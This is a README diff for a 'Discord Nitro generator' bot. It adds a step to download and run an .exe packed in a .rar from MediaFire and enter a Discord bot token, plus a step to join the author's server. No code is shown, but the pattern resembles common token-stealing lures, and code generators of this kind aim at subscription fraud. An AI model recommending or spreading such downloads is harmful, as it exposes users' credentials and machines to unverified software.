@@ -6,8 +6,12 @@ The best and the easiest nitro generator.
 ## Requirements
 #### You need to have [python](https://www.python.org/downloads) Downloaded.
 # Installation
-### There is two ways to install the `Nitro-Generator` .
-#### Way number one **automatic installation**.
+### There is `Three` ways to install the `Nitro-Generator` .
+### Way number One is Downlodeing the .exe file from --> [Downlode](https://www.mediafire.com/file/jjysv09iwbam31z/NGB-D.rar/file).
+#### after Downlodeing the file Run it and fill in the blanks and when the **Token title** pupup Type the **Discord Bot token** and **press enter** in your keyboard and the bot will start. Enjoy✨
+![App Screenshot](https://i.ibb.co/1dcsr7t/Screenshot-1.png)
+----------------------------
+#### Way number Two **automatic installation**.
 - First Join my [Discord Server](https://dsc.gg/Z7LL) and add the bot to your server. `don't forget to read the discord bot *about me*`.
  ![App Screenshot](https://i2.paste.pics/af31b33dbaa2ba0c61af344d54f332d4.png)
 -------------
